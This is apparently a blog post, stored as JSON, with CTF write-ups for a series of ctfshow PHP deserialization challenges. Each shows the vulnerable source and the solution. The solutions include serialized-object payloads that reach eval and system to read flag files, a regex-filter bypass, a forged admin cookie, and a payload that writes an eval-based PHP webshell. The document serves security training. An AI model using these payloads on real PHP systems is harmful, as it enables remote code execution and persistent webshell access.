{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"PHP反序列化","date":"2022-11-25T07:32:45.421Z","updated":"2022-11-25T07:35:57.531Z","comments":true,"path":"api/articles/PHP反序列化.json","keywords":null,"cover":[],"content":"<h1 id=\"PHP反序列化\"><a href=\"#PHP反序列化\" class=\"headerlink\" title=\"PHP反序列化\"></a>PHP反序列化</h1><h2 id=\"web254\"><a href=\"#web254\" class=\"headerlink\" title=\"web254\"></a>web254</h2><pre><code>include('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){\n            $this-&gt;isVip=true;\n        }\n        return $this-&gt;isVip;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = new ctfShowUser();\n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n</code></pre>\n<pre><code>?username=xxxxxx&amp;password=xxxxxx\n</code></pre>\n<h2 id=\"web255\"><a href=\"#web255\" class=\"headerlink\" title=\"web255\"></a>web255</h2><pre><code>include('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n</code></pre>\n<pre><code>GET\n?username=xxxxxx&amp;password=xxxxxx\n\n$user = unserialize($_COOKIE['user']);\n$user-&gt;vipOneKeyGetFlag();\nif($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }\n需要使$this-&gt;isVip的值为True，需要构造链子\n\n&lt;?php\n    class ctfShowUser{\n        public $isVip;\n        public function  __construct(){\n            $this-&gt;isVip = true;\n        }\n    }\n    \n    class ctfShowUser{\n        public $isVip=true;\n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\n由于cookie中将\"作为截断符号，所需要编码绕过，这里采用url编码\nO%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n</code></pre>\n<h2 id=\"web256\"><a href=\"#web256\" class=\"headerlink\" title=\"web256\"></a>web256</h2><pre><code>class ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            if($this-&gt;username!==$this-&gt;password){\n                    echo \"your flag is \".$flag;\n              }\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n</code></pre>\n<pre><code>GET\n?username=1&amp;password=2\n\n&lt;?php\n    class ctfShowUser{\n        public $username='1';\n        public $password='2';\n        public $isVip=true;\n        \n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\nO%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n\nget传入的username和password要等于反序列化对象的username和passwd\n</code></pre>\n<h2 id=\"web257\"><a href=\"#web257\" class=\"headerlink\" title=\"web257\"></a>web257</h2><pre><code>class ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user-&gt;login($username,$password);\n}\n</code></pre>\n<pre><code>&lt;?php\n    class ctfShowUser{\n        private $class = 'backDoor';\n        public function __construct(){\n            $this-&gt;class=new backDoor();\n        }    \n    }\n\n    class backDoor{\n        private $code = 'system(\"cat flag.php\");';\n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\n\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D\n\nGET\n?username=1&amp;password=1\n</code></pre>\n<h2 id=\"web258\"><a href=\"#web258\" class=\"headerlink\" title=\"web258\"></a>web258</h2><pre><code>class ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user-&gt;login($username,$password);\n}\n</code></pre>\n<pre><code>preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])\n正则过滤[oc]是匹配o字符或者c字符，\\d匹配一个数字字符，等价于[0-9]，+:  匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 \"zo\" 以及 \"zoo\"，但不能匹配 \"z\"。+ 等价于 {1,}。/i:  表示匹配的时候不区分大小写\n\"o:\"后不能跟数字，可以加个+号绕过\n\nO:11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}}\n修改为改后：\nO:+11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}}再url编码\n\nO%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system('tac%20f*')%3B%22%3B%7D%7D\n</code></pre>\n<pre><code>error_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user-&gt;login($username,$password);\n}\n</code></pre>\n<h2 id=\"web259\"><a href=\"#web259\" class=\"headerlink\" title=\"web259\"></a>web259</h2><pre><code>$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip-&gt;getFlag();\n</code></pre>\n<p>一般反序列化的题目，那个php页面没用任何已有的类，那大概率就是考察PHP原生类的反序列化。</p>\n<h2 id=\"web260\"><a href=\"#web260\" class=\"headerlink\" title=\"web260\"></a>web260</h2><pre><code>if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n</code></pre>\n<pre><code>?ctfshow=ctfshow_i_love_36D\n\n?ctfshow=s:18:\"ctfshow_i_love_36D\"\n\n？？？？？\n&lt;?php\nclass ctfshow{\n    public $a='ctfshow_i_love_36D';\n}\necho serialize(new ctfshow());\n?&gt;\n?ctfshow=O:7:\"ctfshow\":1:{s:1:\"a\";s:18:\"ctfshow_i_love_36D\";}\n</code></pre>\n<h2 id=\"web261\"><a href=\"#web261\" class=\"headerlink\" title=\"web261\"></a>web261</h2><pre><code>class ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __wakeup(){\n        if($this-&gt;username!='' || $this-&gt;password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this-&gt;code);\n    }\n\n    public function __sleep(){\n        $this-&gt;username='';\n        $this-&gt;password='';\n    }\n    public function __unserialize($data){\n        $this-&gt;username=$data['username'];\n        $this-&gt;password=$data['password'];\n        $this-&gt;code = $this-&gt;username.$this-&gt;password;\n    }\n    public function __destruct(){\n        if($this-&gt;code==0x36d){\n            file_put_contents($this-&gt;username, $this-&gt;password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n</code></pre>\n<pre><code>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，\n则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n\n当反序列化时会进入__unserialize中\n而且也没有什么方法可以进入到__invoke中，所以无法利用危险函数eval\n所以直接就朝着写文件搞就可以了。\n</code></pre>\n<pre><code>&lt;?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n}\n$a=new ctfshowvip('877.php','&lt;?php eval($_POST[1]);?&gt;');\necho serialize($a);\n\nO:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";}\n</code></pre>\n<pre><code>?vip=O:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";}\n访问877.php，并post传入：1=phpinfo();\n成功rce\n\n1=system(\"ls /\");\n1=system(\"cat /flag_is_here\");\n</code></pre>\n<h2 id=\"web262\"><a href=\"#web262\" class=\"headerlink\" title=\"web262\"></a>web262</h2><pre><code>index.php\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n</code></pre>\n<pre><code>message.php\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg-&gt;token=='admin'){\n        echo $flag;\n    }\n}\n</code></pre>\n<pre><code>payload\n\nclass message{\n    public $token='admin';\n}\n$msg = new message;\necho base64_encode(serialize($msg));\n\nTzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP反序列化.assets\\image-20221106231745792.png\" alt=\"image-20221106231745792\"></p>\n<h2 id=\"web263\"><a href=\"#web263\" class=\"headerlink\" title=\"web263\"></a>web263</h2><pre><code>ini_set('session.serialize_handler', 'php');\n\n其中session.serialize_handler是用来设置session的序列话引擎\n不同的引擎所对应的session的存储方式不相同\n\nphp_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n\nphp:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n\nphp_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 \n\nsession 的目录在 /var/lib/php/sessions 中，如果我们执行下面的代码\n&lt;?php\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['name'] = 'spoock';\nvar_dump($_SESSION);\n在 php_serialize 引擎下，会生成一个session文件，session文件中存储的数据为:\na:1:{s:4:\"name\";s:6:\"spoock\";}\n\nphp 引擎下文件内容为:\nname|s:6:\"spoock\";\nphp_binary 引擎下文件内容为:\nnames:6:\"spoock\";\n\n\n\n</code></pre>\n<h2 id=\"web264\"><a href=\"#web264\" class=\"headerlink\" title=\"web264\"></a>web264</h2><pre><code>class message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    $_SESSION['msg']=base64_encode($umsg);\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n</code></pre>\n","text":"PHP反序列化web254include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public funct...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">PHP反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web254\"><span class=\"toc-text\">web254</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web255\"><span class=\"toc-text\">web255</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web256\"><span class=\"toc-text\">web256</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web257\"><span class=\"toc-text\">web257</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web258\"><span class=\"toc-text\">web258</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web259\"><span class=\"toc-text\">web259</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web260\"><span class=\"toc-text\">web260</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web261\"><span class=\"toc-text\">web261</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web262\"><span class=\"toc-text\">web262</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web263\"><span class=\"toc-text\">web263</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web264\"><span class=\"toc-text\">web264</span></a></li></ol></li></ol>","author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"PHP特性","date":"2022-11-25T07:32:45.423Z","updated":"2022-11-25T07:35:57.532Z","comments":true,"path":"api/articles/PHP特性.json","keywords":null,"cover":[],"text":"PHP特性web89利用数组进行绕过 include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match(\"/[0-9]/\", $nu...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[],"tags":[],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"PHP TIPS","date":"2022-11-25T07:32:45.419Z","updated":"2022-11-25T07:35:57.529Z","comments":true,"path":"api/articles/PHP TIPS.json","keywords":null,"cover":null,"text":"PHP TIPS _就是全局变量 eval与system eval可以等价于&lt;? eval(\"asdasdasd;\"); &lt;?php asdasdasd; eval(\"?&gt;\" + \"system(ls);\"); &lt;?php ?&gt;system(ls);...","link":"","photos":[],"count_time":{"symbolsCount":145,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}